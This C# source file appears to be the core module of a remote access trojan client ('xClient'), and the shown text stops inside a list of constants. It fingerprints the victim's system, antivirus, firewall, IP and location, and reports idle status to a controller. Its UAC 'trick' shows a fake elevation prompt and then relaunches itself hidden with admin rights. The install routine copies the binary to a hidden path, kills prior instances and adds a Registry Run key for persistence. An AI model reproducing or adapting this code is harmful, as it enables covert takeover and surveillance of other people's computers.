using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Config;

namespace xClient.Core
{
    public static class SystemCore
    {
        [DllImport("user32.dll")]
        static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [StructLayout(LayoutKind.Sequential)]
        struct LASTINPUTINFO
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));

            [MarshalAs(UnmanagedType.U4)]
            public UInt32 cbSize;
            [MarshalAs(UnmanagedType.U4)]
            public UInt32 dwTime;
        }

        public static readonly string[] ImageList = { "ad.png", "ae.png", "af.png", "ag.png", "ai.png", "al.png", "am.png", "an.png", "ao.png", "ar.png", "as.png", "at.png", "au.png", "aw.png", "ax.png", "az.png", "ba.png", "bb.png", "bd.png", "be.png", "bf.png", "bg.png", "bh.png", "bi.png", "bj.png", "bm.png", "bn.png", "bo.png", "br.png", "bs.png", "bt.png", "bv.png", "bw.png", "by.png", "bz.png", "ca.png", "catalonia.png", "cc.png", "cd.png", "cf.png", "cg.png", "ch.png", "ci.png", "ck.png", "cl.png", "cm.png", "cn.png", "co.png", "cr.png", "cs.png", "cu.png", "cv.png", "cx.png", "cy.png", "cz.png", "de.png", "dj.png", "dk.png", "dm.png", "do.png", "dz.png", "ec.png", "ee.png", "eg.png", "eh.png", "england.png", "er.png", "es.png", "et.png", "europeanunion.png", "fam.png", "fi.png", "fj.png", "fk.png", "fm.png", "fo.png", "fr.png", "ga.png", "gb.png", "gd.png", "ge.png", "gf.png", "gh.png", "gi.png", "gl.png", "gm.png", "gn.png", "gp.png", "gq.png", "gr.png", "gs.png", "gt.png", "gu.png", "gw.png", "gy.png", "hk.png", "hm.png", "hn.png", "hr.png", "ht.png", "hu.png", "id.png", "ie.png", "il.png", "in.png", "io.png", "iq.png", "ir.png", "is.png", "it.png", "jm.png", "jo.png", "jp.png", "ke.png", "kg.png", "kh.png", "ki.png", "km.png", "kn.png", "kp.png", "kr.png", "kw.png", "ky.png", "kz.png", "la.png", "lb.png", "lc.png", "li.png", "lk.png", "lr.png", "ls.png", "lt.png", "lu.png", "lv.png", "ly.png", "ma.png", "mc.png", "md.png", "me.png", "mg.png", "mh.png", "mk.png", "ml.png", "mm.png", "mn.png", "mo.png", "mp.png", "mq.png", "mr.png", "ms.png", "mt.png", "mu.png", "mv.png", "mw.png", "mx.png", "my.png", "mz.png", "na.png", "nc.png", "ne.png", "nf.png", "ng.png", "ni.png", "nl.png", "no.png", "np.png", "nr.png", "nu.png", "nz.png", "om.png", "pa.png", "pe.png", "pf.png", "pg.png", "ph.png", "pk.png", "pl.png", "pm.png", "pn.png", "pr.png", "ps.png", "pt.png", "pw.png", "py.png", "qa.png", "re.png", "ro.png", "rs.png", "ru.png", "rw.png", "sa.png", "sb.png", "sc.png", "scotland.png", "sd.png", "se.png", "sg.png", "sh.png", "si.png", "sj.png", "sk.png", "sl.png", "sm.png", "sn.png", "so.png", "sr.png", "st.png", "sv.png", "sy.png", "sz.png", "tc.png", "td.png", "tf.png", "tg.png", "th.png", "tj.png", "tk.png", "tl.png", "tm.png", "tn.png", "to.png", "tr.png", "tt.png", "tv.png", "tw.png", "tz.png", "ua.png", "ug.png", "um.png", "us.png", "uy.png", "uz.png", "va.png", "vc.png", "ve.png", "vg.png", "vi.png", "vn.png", "vu.png", "wales.png", "wf.png", "ws.png", "ye.png", "yt.png", "za.png", "zm.png", "zw.png" };
        public static bool Disconnect = false;
        public static string OperatingSystem = string.Empty;
        public static string MyPath = string.Empty;
        public static string InstallPath = string.Empty;
        public static string AccountType = string.Empty;
        public static string WANIP = string.Empty;
        public static string Country = string.Empty;
        public static string CountryCode = string.Empty;
        public static string Region = string.Empty;
        public static string City = string.Empty;
        public static string lastStatus = "Active";
        public static int ImageIndex = 0;

        public static string GetOperatingSystem()
        {
            return string.Format("{0} {1} {2} Bit", OSInfo.Name, OSInfo.Edition, OSInfo.Bits);
        }

        public static string GetAccountType()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                return "Admin";
            else if (principal.IsInRole(WindowsBuiltInRole.User))
                return "User";
            else if (principal.IsInRole(WindowsBuiltInRole.Guest))
                return "Guest";
            else
                return "Unknown";
        }

        public static string GetCpu()
        {
            try
            {
                string CPUName = string.Empty;
                string Query = "SELECT * FROM Win32_Processor";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", Query);
                foreach (ManagementObject Mobject in searcher.Get())
                    CPUName = Mobject["Name"].ToString();
                
                return CPUName;
            }
            catch
            {
                return "Unknown";
            }
        }

        public static int GetRam()
        {
            try
            {
                int installedRAM = 0;
                string Query = "Select * From Win32_ComputerSystem";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(Query);
                foreach (ManagementObject Mobject in searcher.Get())
                {
                    double bytes = (Convert.ToDouble(Mobject["TotalPhysicalMemory"]));
                    installedRAM = (int)(bytes / 1048576);
                }

                return installedRAM;
            }
            catch
            {
                return -1;
            }
        }

        public static string GetUptime()
        {
            int uptimeSec = Environment.TickCount / 1000;
            TimeSpan result = TimeSpan.FromSeconds(uptimeSec);
            return string.Format("{0}d : {1}h : {2}m : {3}s", result.Days, result.Hours, result.Minutes, result.Seconds);
        }

        public static string GetUsername()
        {
            return Environment.UserName;
        }

        public static string GetPcName()
        {
            return Environment.MachineName;
        }

        public static string GetGpu()
        {
            try
            {
                string GPUName = string.Empty;
                string Query = "SELECT * FROM Win32_DisplayConfiguration";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(Query);
                foreach (ManagementObject Mobject in searcher.Get())
                    GPUName = Mobject["Description"].ToString();

                return (!string.IsNullOrEmpty(GPUName)) ? GPUName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetLanIp()
        {
            IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress[] hosts = host.AddressList;
            string localIP = (host.AddressList.Length > 0) ? "" : "-";

            for (int i = host.AddressList.Length - 1; i >= 0; i--)
            {
                if (hosts[i].AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP += hosts[i].ToString() + ", ";
                }
            }

            return (localIP == "-") ? localIP : localIP.Remove(localIP.Length - 2); ;
        }

        public static string GetAntivirus()
        {
            try
            {
                string AntivirusName = string.Empty;
                string Scope = (Helper.Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
                string Query = "SELECT * FROM AntivirusProduct";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(Scope, Query);
                foreach (ManagementObject Mobject in searcher.Get())
                    AntivirusName = Mobject["displayName"].ToString();

                return (!string.IsNullOrEmpty(AntivirusName)) ? AntivirusName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetFirewall()
        {
            try
            {
                string FirewallName = string.Empty;
                string Scope = (Helper.Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
                string Query = "SELECT * FROM FirewallProduct";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(Scope, Query);
                foreach (ManagementObject Mobject in searcher.Get())
                    FirewallName = Mobject["displayName"].ToString();

                return (!string.IsNullOrEmpty(FirewallName)) ? FirewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static void InitializeGeoIp()
        {
            GeoIP gIP = new GeoIP();

            Country = gIP.Country;
            CountryCode = gIP.CountryCode;
            Region = gIP.Region;
            City = gIP.City;
            WANIP = gIP.WANIP;

            gIP = null;

            if (CountryCode == "-" || Country == "Unknown")
            {
                ImageIndex = 247; // question icon
                return;
            }

            for (int i = 0; i < ImageList.Length; i++)
            {
                if (ImageList[i].Contains(CountryCode.ToLower()))
                {
                    ImageIndex = i;
                    break;
                }
            }
        }

        public static bool TryUacTrick()
        {
            if (AccountType == "Admin")
                return false;

            if (MyPath == InstallPath)
                return false;

            Thread.Sleep(3000);

            Application.Run(new global::xClient.Core.Elevation.frmElevation());

            Thread.Sleep(200);

            Application.Exit();

            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Verb = "runas";
            processStartInfo.Arguments = "/k START \"\" \"" + MyPath + "\" -CHECK & PING -n 2 127.0.0.1 & EXIT";
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processStartInfo.UseShellExecute = true;
            try
            {
                Process.Start(processStartInfo);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool CreateMutex(ref Mutex mutex)
        {
            bool createdNew = false;
            mutex = new System.Threading.Mutex(false, Settings.MUTEX, out createdNew);
            return createdNew;
        }

        public static void UserIdleThread()
        {
            while (!Disconnect)
            {
                Thread.Sleep(5000);
                if (IsUserIdle())
                {
                    if (lastStatus != "Idle")
                    {
                        lastStatus = "Idle";
                        new global::xClient.Core.Packets.ClientPackets.UserStatus(lastStatus).Execute(Program._Client);
                    }
                }
                else
                {
                    if (lastStatus != "Active")
                    {
                        lastStatus = "Active";
                        new global::xClient.Core.Packets.ClientPackets.UserStatus(lastStatus).Execute(Program._Client);
                    }
                }
            }
        }

        private static bool IsUserIdle()
        {
            uint idleTime = 0;
            LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
            lastInputInfo.dwTime = 0;

            uint envTicks = (uint)Environment.TickCount;

            if (GetLastInputInfo(ref lastInputInfo))
            {
                uint lastInputTick = lastInputInfo.dwTime;
                idleTime = envTicks - lastInputTick;
            }

            idleTime = ((idleTime > 0) ? (idleTime / 1000) : 0);

            return (idleTime > 600) ? true : false; // idle for 10 minutes
        }

        public static void Install()
        {
            bool isKilled = false;

            // create target dir
            if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
                Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));

            // delete existing file
            if (File.Exists(SystemCore.InstallPath))
            {
                try
                {
                    File.Delete(SystemCore.InstallPath);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        // kill old process if new mutex
                        Process[] foundProcesses = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(InstallPath));
                        int myPid = Process.GetCurrentProcess().Id;
                        foreach (var prc in foundProcesses)
                        {
                            if (prc.Id != myPid)
                            {
                                prc.Kill();
                                isKilled = true;
                            }
                        }
                    }
                }
            }

            if (isKilled)
                Thread.Sleep(5000);

            //copy client to target dir
            File.Copy(SystemCore.MyPath, SystemCore.InstallPath, true);

            //add to startup
            if (Settings.STARTUP)
            {
                if (AccountType == "Admin")
                {
                    try // try localmachine
                    {
                        RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        key.SetValue(Settings.STARTUPKEY, SystemCore.InstallPath);
                        key.Close();
                    }
                    catch
                    {
                        try // if fails use currentuser
                        {
                            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                            key.SetValue(Settings.STARTUPKEY, SystemCore.InstallPath);
                            key.Close();
                        }
                        catch
                        { }
                    }
                }
                else
                {
                    try
                    {
                        RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        key.SetValue(Settings.STARTUPKEY, SystemCore.InstallPath);
                        key.Close();
                    }
                    catch
                    { }
                }
            }

            if (Settings.HIDEFILE)
                File.SetAttributes(SystemCore.InstallPath, FileAttributes.Hidden);

            //start file
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = true;
            startInfo.FileName = SystemCore.InstallPath;
            Process.Start(startInfo);

            SystemCore.Disconnect = true;
        }
    }

    static public class OSInfo
    {
        #region BITS
        /// <summary>
        /// Determines if the current application is 32 or 64-bit.
        /// </summary>
        static public int Bits
        {
            get
            {
                return IntPtr.Size * 8;
            }
        }
        #endregion BITS

        #region EDITION
        static private string s_Edition;
        /// <summary>
        /// Gets the edition of the operating system running on this computer.
        /// </summary>
        static public string Edition
        {
            get
            {
                if (s_Edition != null)
                    return s_Edition;  //***** RETURN *****//

                string edition = String.Empty;

                OperatingSystem osVersion = Environment.OSVersion;
                OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
                osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));

                if (GetVersionEx(ref osVersionInfo))
                {
                    int majorVersion = osVersion.Version.Major;
                    int minorVersion = osVersion.Version.Minor;
                    byte productType = osVersionInfo.wProductType;
                    short suiteMask = osVersionInfo.wSuiteMask;

                    #region VERSION 4
                    if (majorVersion == 4)
                    {
                        if (productType == VER_NT_WORKSTATION)
                        {
                            // Windows NT 4.0 Workstation
                            edition = "Workstation";
                        }
                        else if (productType == VER_NT_SERVER)
                        {
                            if ((suiteMask & VER_SUITE_ENTERPRISE) != 0)
                            {
                                // Windows NT 4.0 Server Enterprise
                                edition = "Enterprise Server";
                            }
                            else
                            {
                                // Windows NT 4.0 Server
                                edition = "Standard Server";
                            }
                        }
                    }
                    #endregion VERSION 4

                    #region VERSION 5
                    else if (majorVersion == 5)
                    {
                        if (productType == VER_NT_WORKSTATION)
                        {
                            if ((suiteMask & VER_SUITE_PERSONAL) != 0)
                            {
                                // Windows XP Home Edition
                                edition = "Home";
                            }
                            else
                            {
                                // Windows XP / Windows 2000 Professional
                                edition = "Professional";
                            }
                        }
                        else if (productType == VER_NT_SERVER)
                        {
                            if (minorVersion == 0)
                            {
                                if ((suiteMask & VER_SUITE_DATACENTER) != 0)
                                {
                                    // Windows 2000 Datacenter Server
                                    edition = "Datacenter Server";
                                }
                                else if ((suiteMask & VER_SUITE_ENTERPRISE) != 0)
                                {
                                    // Windows 2000 Advanced Server
                                    edition = "Advanced Server";
                                }
                                else
                                {
                                    // Windows 2000 Server
                                    edition = "Server";
                                }
                            }
                            else
                            {
                                if ((suiteMask & VER_SUITE_DATACENTER) != 0)
                                {
                                    // Windows Server 2003 Datacenter Edition
                                    edition = "Datacenter";
                                }
                                else if ((suiteMask & VER_SUITE_ENTERPRISE) != 0)
                                {
                                    // Windows Server 2003 Enterprise Edition
                                    edition = "Enterprise";
                                }
                                else if ((suiteMask & VER_SUITE_BLADE) != 0)
                                {
                                    // Windows Server 2003 Web Edition
                                    edition = "Web Edition";
                                }
                                else
                                {
                                    // Windows Server 2003 Standard Edition
                                    edition = "Standard";
                                }
                            }
                        }
                    }
                    #endregion VERSION 5

                    #region VERSION 6
                    else if (majorVersion == 6)
                    {
                        int ed;
                        if (GetProductInfo(majorVersion, minorVersion,
                            osVersionInfo.wServicePackMajor, osVersionInfo.wServicePackMinor,
                            out ed))
                        {
                            switch (ed)
                            {
                                case PRODUCT_BUSINESS:
                                    edition = "Business";
                                    break;
                                case PRODUCT_BUSINESS_N:
                                    edition = "Business N";
                                    break;
                                case PRODUCT_CLUSTER_SERVER:
                                    edition = "HPC Edition";
                                    break;
                                case PRODUCT_CLUSTER_SERVER_V:
                                    edition = "HPC Edition without Hyper-V";
                                    break;
                                case PRODUCT_DATACENTER_SERVER:
                                    edition = "Datacenter Server";
                                    break;
                                case PRODUCT_DATACENTER_SERVER_CORE:
                                    edition = "Datacenter Server (core installation)";
                                    break;
                                case PRODUCT_DATACENTER_SERVER_V:
                                    edition = "Datacenter Server without Hyper-V";
                                    break;
                                case PRODUCT_DATACENTER_SERVER_CORE_V:
                                    edition = "Datacenter Server without Hyper-V (core installation)";
                                    break;
                                case PRODUCT_EMBEDDED:
                                    edition = "Embedded";
                                    break;
                                case PRODUCT_ENTERPRISE:
                                    edition = "Enterprise";
                                    break;
                                case PRODUCT_ENTERPRISE_N:
                                    edition = "Enterprise N";
                                    break;
                                case PRODUCT_ENTERPRISE_E:
                                    edition = "Enterprise E";
                                    break;
                                case PRODUCT_ENTERPRISE_SERVER:
                                    edition = "Enterprise Server";
                                    break;
                                case PRODUCT_ENTERPRISE_SERVER_CORE:
                                    edition = "Enterprise Server (core installation)";
                                    break;
                                case PRODUCT_ENTERPRISE_SERVER_CORE_V:
                                    edition = "Enterprise Server without Hyper-V (core installation)";
                                    break;
                                case PRODUCT_ENTERPRISE_SERVER_IA64:
                                    edition = "Enterprise Server for Itanium-based Systems";
                                    break;
                                case PRODUCT_ENTERPRISE_SERVER_V:
                                    edition = "Enterprise Server without Hyper-V";
                                    break;
                                case PRODUCT_ESSENTIALBUSINESS_SERVER_MGMT:
                                    edition = "Essential Business Server MGMT";
                                    break;
                                case PRODUCT_ESSENTIALBUSINESS_SERVER_ADDL:
                                    edition = "Essential Business Server ADDL";
                                    break;
                                case PRODUCT_ESSENTIALBUSINESS_SERVER_MGMTSVC:
                                    edition = "Essential Business Server MGMTSVC";
                                    break;
                                case PRODUCT_ESSENTIALBUSINESS_SERVER_ADDLSVC:
                                    edition = "Essential Business Server ADDLSVC";
                                    break;
                                case PRODUCT_HOME_BASIC:
                                    edition = "Home Basic";
                                    break;
                                case PRODUCT_HOME_BASIC_N:
                                    edition = "Home Basic N";
                                    break;
                                case PRODUCT_HOME_BASIC_E:
                                    edition = "Home Basic E";
                                    break;
                                case PRODUCT_HOME_PREMIUM:
                                    edition = "Home Premium";
                                    break;
                                case PRODUCT_HOME_PREMIUM_N:
                                    edition = "Home Premium N";
                                    break;
                                case PRODUCT_HOME_PREMIUM_E:
                                    edition = "Home Premium E";
                                    break;
                                case PRODUCT_HOME_PREMIUM_SERVER:
                                    edition = "Home Premium Server";
                                    break;
                                case PRODUCT_HYPERV:
                                    edition = "Microsoft Hyper-V Server";
                                    break;
                                case PRODUCT_MEDIUMBUSINESS_SERVER_MANAGEMENT:
                                    edition = "Windows Essential Business Management Server";
                                    break;
                                case PRODUCT_MEDIUMBUSINESS_SERVER_MESSAGING:
                                    edition = "Windows Essential Business Messaging Server";
                                    break;
                                case PRODUCT_MEDIUMBUSINESS_SERVER_SECURITY:
                                    edition = "Windows Essential Business Security Server";
                                    break;
                                case PRODUCT_PROFESSIONAL:
                                    edition = "Professional";
                                    break;
                                case PRODUCT_PROFESSIONAL_N:
                                    edition = "Professional N";
                                    break;
                                case PRODUCT_PROFESSIONAL_E:
                                    edition = "Professional E";
                                    break;
                                case PRODUCT_SB_SOLUTION_SERVER:
                                    edition = "SB Solution Server";
                                    break;
                                case PRODUCT_SB_SOLUTION_SERVER_EM:
                                    edition = "SB Solution Server EM";
                                    break;
                                case PRODUCT_SERVER_FOR_SB_SOLUTIONS:
                                    edition = "Server for SB Solutions";
                                    break;
                                case PRODUCT_SERVER_FOR_SB_SOLUTIONS_EM:
                                    edition = "Server for SB Solutions EM";
                                    break;
                                case PRODUCT_SERVER_FOR_SMALLBUSINESS:
                                    edition = "Windows Essential Server Solutions";
                                    break;
                                case PRODUCT_SERVER_FOR_SMALLBUSINESS_V:
                                    edition = "Windows Essential Server Solutions without Hyper-V";
                                    break;
                                case PRODUCT_SERVER_FOUNDATION:
                                    edition = "Server Foundation";
                                    break;
                                case PRODUCT_SMALLBUSINESS_SERVER:
                                    edition = "Windows Small Business Server";
                                    break;
                                case PRODUCT_SMALLBUSINESS_SERVER_PREMIUM:
                                    edition = "Windows Small Business Server Premium";
                                    break;
                                case PRODUCT_SMALLBUSINESS_SERVER_PREMIUM_CORE:
                                    edition = "Windows Small Business Server Premium (core installation)";
                                    break;
                                case PRODUCT_SOLUTION_EMBEDDEDSERVER:
                                    edition = "Solution Embedded Server";
                                    break;
                                case PRODUCT_SOLUTION_EMBEDDEDSERVER_CORE:
                                    edition = "Solution Embedded Server (core installation)";
                                    break;
                                case PRODUCT_STANDARD_SERVER:
                                    edition = "Standard Server";
                                    break;
                                case PRODUCT_STANDARD_SERVER_CORE:
                                    edition = "Standard Server (core installation)";
                                    break;
                                case PRODUCT_STANDARD_SERVER_SOLUTIONS:
                                    edition = "Standard Server Solutions";
                                    break;
                                case PRODUCT_STANDARD_SERVER_SOLUTIONS_CORE:
                                    edition = "Standard Server Solutions (core installation)";
                                    break;
                                case PRODUCT_STANDARD_SERVER_CORE_V:
                                    edition = "Standard Server without Hyper-V (core installation)";
                                    break;
                                case PRODUCT_STANDARD_SERVER_V:
                                    edition = "Standard Server without Hyper-V";
                                    break;
                                case PRODUCT_STARTER:
                                    edition = "Starter";
                                    break;
                                case PRODUCT_STARTER_N:
                                    edition = "Starter N";
                                    break;
                                case PRODUCT_STARTER_E:
                                    edition = "Starter E";
                                    break;
                                case PRODUCT_STORAGE_ENTERPRISE_SERVER:
                                    edition = "Enterprise Storage Server";
                                    break;
                                case PRODUCT_STORAGE_ENTERPRISE_SERVER_CORE:
                                    edition = "Enterprise Storage Server (core installation)";
                                    break;
                                case PRODUCT_STORAGE_EXPRESS_SERVER:
                                    edition = "Express Storage Server";
                                    break;
                                case PRODUCT_STORAGE_EXPRESS_SERVER_CORE:
                                    edition = "Express Storage Server (core installation)";
                                    break;
                                case PRODUCT_STORAGE_STANDARD_SERVER:
                                    edition = "Standard Storage Server";
                                    break;
                                case PRODUCT_STORAGE_STANDARD_SERVER_CORE:
                                    edition = "Standard Storage Server (core installation)";
                                    break;
                                case PRODUCT_STORAGE_WORKGROUP_SERVER:
                                    edition = "Workgroup Storage Server";
                                    break;
                                case PRODUCT_STORAGE_WORKGROUP_SERVER_CORE:
                                    edition = "Workgroup Storage Server (core installation)";
                                    break;
                                case PRODUCT_UNDEFINED:
                                    edition = "Unknown product";
                                    break;
                                case PRODUCT_ULTIMATE:
                                    edition = "Ultimate";
                                    break;
                                case PRODUCT_ULTIMATE_N:
                                    edition = "Ultimate N";
                                    break;
                                case PRODUCT_ULTIMATE_E:
                                    edition = "Ultimate E";
                                    break;
                                case PRODUCT_WEB_SERVER:
                                    edition = "Web Server";
                                    break;
                                case PRODUCT_WEB_SERVER_CORE:
                                    edition = "Web Server (core installation)";
                                    break;
                                case PRODUCT_ENTERPRISE_EVALUATION:
                                    edition = "Server Enterprise (evaluation installation)";
                                    break;
                                case PRODUCT_MULTIPOINT_STANDARD_SERVER:
                                    edition = "Windows MultiPoint Server Standard (full installation)";
                                    break;
                                case PRODUCT_MULTIPOINT_PREMIUM_SERVER:
                                    edition = "Windows MultiPoint Server Premium (full installation)";
                                    break;
                                case PRODUCT_STANDARD_EVALUATION_SERVER:
                                    edition = "Server Standard (evaluation installation)";
                                    break;
                                case PRODUCT_DATACENTER_EVALUATION_SERVER:
                                    edition = "Server Datacenter (evaluation installation)";
                                    break;
                                case PRODUCT_ENTERPRISE_N_EVALUATION:
                                    edition = "Enterprise N (evaluation installation)";
                                    break;
                                case PRODUCT_EMBEDDED_AUTOMOTIVE:
                                    edition = "PRODUCT_EMBEDDED_AUTOMOTIVE"; // No known definition
                                    break;
                                case PRODUCT_EMBEDDED_INDUSTRY_A:
                                    edition = "PRODUCT_EMBEDDED_INDUSTRY_A"; // No known definition
                                    break;
                                case PRODUCT_THINPC:
                                    edition = "PRODUCT_THINPC"; // No known definition
                                    break;
                                case PRODUCT_EMBEDDED_A:
                                    edition = "PRODUCT_EMBEDDED_A"; // No known definition
                                    break;
                                case PRODUCT_EMBEDDED_INDUSTRY:
                                    edition = "PRODUCT_EMBEDDED_INDUSTRY"; // No known definition
                                    break;
                                case PRODUCT_EMBEDDED_E:
                                    edition = "PRODUCT_EMBEDDED_E"; // No known definition
                                    break;
                                case PRODUCT_EMBEDDED_INDUSTRY_E:
                                    edition = "PRODUCT_EMBEDDED_INDUSTRY_E"; // No known definition
                                    break;
                                case PRODUCT_EMBEDDED_INDUSTRY_A_E:
                                    edition = "PRODUCT_EMBEDDED_INDUSTRY_A_E"; // No known definition
                                    break;
                                case PRODUCT_STORAGE_WORKGROUP_EVALUATION_SERVER:
                                    edition = "Storage Server Workgroup (evaluation installation)";
                                    break;
                                case PRODUCT_STORAGE_STANDARD_EVALUATION_SERVER:
                                    edition = "Storage Server Standard (evaluation installation)";
                                    break;
                                case PRODUCT_CORE_ARM:
                                    edition = "PRODUCT_CORE_ARM"; // No known definition
                                    break;
                                case PRODUCT_CORE_N:
                                    edition = "N";
                                    break;
                                case PRODUCT_CORE_COUNTRYSPECIFIC:
                                    edition = "China";
                                    break;
                                case PRODUCT_CORE_SINGLELANGUAGE:
                                    edition = "Single Language";
                                    break;
                                case PRODUCT_CORE:
                                    edition = "";
                                    break;
                                case PRODUCT_PROFESSIONAL_WMC:
                                    edition = "Professional with Media Center";
                                    break;
                            }
                        }
                    }
                    #endregion VERSION 6
                }

                s_Edition = edition;
                return edition;
            }
        }
        #endregion EDITION

        #region NAME
        static private string s_Name;
        /// <summary>
        /// Gets the name of the operating system running on this computer.
        /// </summary>
        static public string Name
        {
            get
            {
                if (s_Name != null)
                    return s_Name;  //***** RETURN *****//

                string name = "unknown";

                OperatingSystem osVersion = Environment.OSVersion;
                OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
                osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));

                if (GetVersionEx(ref osVersionInfo))
                {
                    int majorVersion = osVersion.Version.Major;
                    int minorVersion = osVersion.Version.Minor;

                    switch (osVersion.Platform)
                    {
                        case PlatformID.Win32Windows:
                            {
                                if (majorVersion == 4)
                                {
                                    string csdVersion = osVersionInfo.szCSDVersion;
                                    switch (minorVersion)
                                    {
                                        case 0:
                                            if (csdVersion == "B" || csdVersion == "C")
                                                name = "Windows 95 OSR2";
                                            else
                                                name = "Windows 95";
                                            break;
                                        case 10:
                                            if (csdVersion == "A")
                                                name = "Windows 98 Second Edition";
                                            else
                                                name = "Windows 98";
                                            break;
                                        case 90:
                                            name = "Windows Me";
                                            break;
                                    }
                                }
                                break;
                            }

                        case PlatformID.Win32NT:
                            {
                                byte productType = osVersionInfo.wProductType;

                                switch (majorVersion)
                                {
                                    case 3:
                                        name = "Windows NT 3.51";
                                        break;
                                    case 4:
                                        switch (productType)
                                        {
                                            case 1:
                                                name = "Windows NT 4.0";
                                                break;
                                            case 3:
                                                name = "Windows NT 4.0 Server";
                                                break;
                                        }
                                        break;
                                    case 5:
                                        switch (minorVersion)
                                        {
                                            case 0:
                                                name = "Windows 2000";
                                                break;
                                            case 1:
                                                name = "Windows XP";
                                                break;
                                            case 2:
                                                name = "Windows Server 2003";
                                                break;
                                        }
                                        break;
                                    case 6:
                                        switch (minorVersion)
                                        {
                                            case 0:
                                                name = (productType == 1) ? "Windows Vista" : "Windows Server 2008";
                                                break;
                                            case 1:
                                                name = (productType == 1) ? "Windows 7" : "Windows Server 2008 R2";
                                                break;
                                            case 2:
                                                name = (productType == 1) ? "Windows 8" : "Windows Server 2012";
                                                break;
                                            case 3:
                                                name = (productType == 1) ? "Windows 8.1" : "Windows Server 2012 R2";
                                                break;
                                        }
                                        break;
                                }
                                break;
                            }
                    }
                }

                s_Name = name;
                return name;
            }
        }
        #endregion NAME

        #region PINVOKE
        #region GET
        #region PRODUCT INFO
        [DllImport("kernel32.dll")]
        internal static extern bool GetProductInfo(
            int osMajorVersion,
            int osMinorVersion,
            int spMajorVersion,
            int spMinorVersion,
            out int edition);
        #endregion PRODUCT INFO

        #region VERSION
        [DllImport("kernel32.dll")]
        private static extern bool GetVersionEx(ref OSVERSIONINFOEX osVersionInfo);
        #endregion VERSION
        #endregion GET

        #region OSVERSIONINFOEX
        [StructLayout(LayoutKind.Sequential)]
        private struct OSVERSIONINFOEX
        {
            public int dwOSVersionInfoSize;
            public int dwMajorVersion;
            public int dwMinorVersion;
            public int dwBuildNumber;
            public int dwPlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string szCSDVersion;
            public short wServicePackMajor;
            public short wServicePackMinor;
            public short wSuiteMask;
            public byte wProductType;
            public byte wReserved;
        }
        #endregion OSVERSIONINFOEX

        #region PRODUCT
        private const int PRODUCT_UNDEFINED = 0x00000000;
        private const int PRODUCT_ULTIMATE = 0x00000001;
        private const int PRODUCT_HOME_BASIC = 0x00000002;
        private const int PRODUCT_HOME_PREMIUM = 0x00000003;
        private const int PRODUCT_ENTERPRISE = 0x00000004;
        private const int PRODUCT_HOME_BASIC_N = 0x00000005;
        private const int PRODUCT_BUSINESS = 0x00000006;
        private const int PRODUCT_STANDARD_SERVER = 0x00000007;
        private const int PRODUCT_DATACENTER_SERVER = 0x00000008;
        private const int PRODUCT_SMALLBUSINESS_SERVER = 0x00000009;
        private const int PRODUCT_ENTERPRISE_SERVER = 0x0000000A;
        private const int PRODUCT_STARTER = 0x0000000B;
        private const int PRODUCT_DATACENTER_SERVER_CORE = 0x0000000C;
        private const int PRODUCT_STANDARD_SERVER_CORE = 0x0000000D;
        private const int PRODUCT_ENTERPRISE_SERVER_CORE = 0x0000000E;
        private const int PRODUCT_ENTERPRISE_SERVER_IA64 = 0x0000000F;
        private const int PRODUCT_BUSINESS_N = 0x00000010;
        private const int PRODUCT_WEB_SERVER = 0x00000011;
        private const int PRODUCT_CLUSTER_SERVER = 0x00000012;
        private const int PRODUCT_HOME_SERVER = 0x00000013;
        private const int PRODUCT_STORAGE_EXPRESS_SERVER = 0x00000014;
        private const int PRODUCT_STORAGE_STANDARD_SERVER = 0x00000015;
        private const int PRODUCT_STORAGE_WORKGROUP_SERVER = 0x00000016;
        private const int PRODUCT_STORAGE_ENTERPRISE_SERVER = 0x00000017;
        private const int PRODUCT_SERVER_FOR_SMALLBUSINESS = 0x00000018;
